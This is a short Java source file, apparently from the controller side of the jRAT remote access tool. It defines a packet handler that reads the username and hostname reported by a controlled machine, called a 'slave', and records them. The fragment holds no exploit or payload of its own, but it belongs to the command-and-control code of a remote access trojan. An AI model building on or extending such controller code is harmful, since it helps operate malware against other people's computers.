package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;

import java.io.DataInputStream;


public class Packet5InitUserHost extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String username = slave.readLine();
		String hostname = slave.readLine();
		
		slave.setUsername(username);
		slave.setHostname(hostname);
	}

}
